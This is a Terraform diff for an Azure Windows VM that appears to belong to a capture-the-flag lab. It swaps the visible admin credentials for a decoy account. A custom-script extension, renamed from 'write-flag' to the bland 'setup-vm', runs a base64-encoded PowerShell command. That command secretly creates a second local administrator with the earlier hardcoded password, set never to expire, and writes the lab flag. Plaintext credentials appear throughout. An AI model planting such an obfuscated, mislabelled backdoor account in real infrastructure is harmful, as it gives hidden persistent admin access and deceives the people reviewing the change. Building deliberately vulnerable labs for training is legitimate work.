@@ -1,6 +1,6 @@
 resource "azurerm_resource_group" "vm_cs" {
-  name     = "admin-vm-rg"
-  location = "West Europe"
+  name     = "admin-vm-rg${local.name_suffix_dash}"
+  location = var.location
 }
 
 # Create virtual network
@@ -24,7 +24,8 @@ resource "azurerm_public_ip" "vm_cs" {
   name                = "admin-vm-public-ip"
   location            = azurerm_resource_group.vm_cs.location
   resource_group_name = azurerm_resource_group.vm_cs.name
-  allocation_method   = "Dynamic"
+  allocation_method   = "Static"
+  sku                 = "Standard"
 }
 
 # Create Network Security Group and rules
@@ -69,12 +70,16 @@ resource "azurerm_network_interface_security_group_association" "vm_cs" {
 # Create virtual machine
 resource "azurerm_windows_virtual_machine" "vm_cs" {
   name                  = "admin-vm"
-  admin_username        = "ytirucsboybytiruces"
-  admin_password        = "IWillNotRememberThisPassword1."
+  admin_username        = "wrongguy"
+  admin_password        = "Wr0ngGuyIsN0tTheAnswer!"
   location              = azurerm_resource_group.vm_cs.location
   resource_group_name   = azurerm_resource_group.vm_cs.name
   network_interface_ids = [azurerm_network_interface.vm_cs.id]
-  size                  = "Standard_B2s"
+
+  tags = {
+    cumulonimbus = "lab"
+  }
+  size                  = "Standard_D2s_v3"
 
   os_disk {
     name                 = "adminVmDisk"
@@ -88,21 +93,35 @@ resource "azurerm_windows_virtual_machine" "vm_cs" {
     sku       = "2022-datacenter-azure-edition"
     version   = "latest"
   }
+
 }
 
-resource "azurerm_virtual_machine_extension" "write_flag" {
-  name                       = "write-flag"
+resource "azurerm_virtual_machine_extension" "setup_vm" {
+  name                       = "setup-vm"
   virtual_machine_id         = azurerm_windows_virtual_machine.vm_cs.id
   publisher                  = "Microsoft.Compute"
   type                       = "CustomScriptExtension"
   type_handler_version       = "1.8"
   auto_upgrade_minor_version = true
 
-  settings = <<SETTINGS
-    {
-      "commandToExecute": "powershell.exe -Command \"New-Item 'C:/flag.txt' -ItemType File -Value 'Cumulonimbus{CSStorageMustBeLockedDown}'\""
-    }
-  SETTINGS
+  settings = jsonencode({
+    commandToExecute = "powershell.exe -NoProfile -NonInteractive -EncodedCommand JABwAHcAIAA9ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBTAGUAYwB1AHIAZQBTAHQAcgBpAG4AZwAgACcASQBXAGkAbABsAE4AbwB0AFIAZQBtAGUAbQBiAGUAcgBUAGgAaQBzAFAAYQBzAHMAdwBvAHIAZAAxAC4AJwAgAC0AQQBzAFAAbABhAGkAbgBUAGUAeAB0ACAALQBGAG8AcgBjAGUAOwAgAE4AZQB3AC0ATABvAGMAYQBsAFUAcwBlAHIAIAAtAE4AYQBtAGUAIAB5AHQAaQByAHUAYwBzAGIAbwB5AGIAeQB0AGkAcgB1AGMAZQBzACAALQBQAGEAcwBzAHcAbwByAGQAIAAkAHAAdwAgAC0AUABhAHMAcwB3AG8AcgBkAE4AZQB2AGUAcgBFAHgAcABpAHIAZQBzADsAIABBAGQAZAAtAEwAbwBjAGEAbABHAHIAbwB1AHAATQBlAG0AYgBlAHIAIAAtAEcAcgBvAHUAcAAgAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAgAC0ATQBlAG0AYgBlAHIAIAB5AHQAaQByAHUAYwBzAGIAbwB5AGIAeQB0AGkAcgB1AGMAZQBzADsAIABTAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAnAEMAOgAvAFUAcwBlAHIAcwAvAFAAdQBiAGwAaQBjAC8ARABlAHMAawB0AG8AcAAvAGYAbABhAGcALgB0AHgAdAAnACAAJwBDAHUAbQB1AGwAbwBuAGkAbQBiAHUAcwB7AEMAUwBTAHQAbwByAGEAZwBlAE0AdQBzAHQAQgBlAEwAbwBjAGsAZQBkAEQAbwB3AG4AfQAnAA=="
+  })
 }
 
 
+
+# Cost control: auto-deallocate this VM daily at 23:59 UTC (Azure stops compute billing
+# when a VM is deallocated). Change daily_recurrence_time/timezone to suit;
+# restart the VM from the portal or `az vm start` when you need it again.
+resource "azurerm_dev_test_global_vm_shutdown_schedule" "vm_cs" {
+  virtual_machine_id    = azurerm_windows_virtual_machine.vm_cs.id
+  location              = azurerm_windows_virtual_machine.vm_cs.location
+  enabled               = true
+  daily_recurrence_time = "2359"
+  timezone              = "UTC"
+
+  notification_settings {
+    enabled = false
+  }
+}
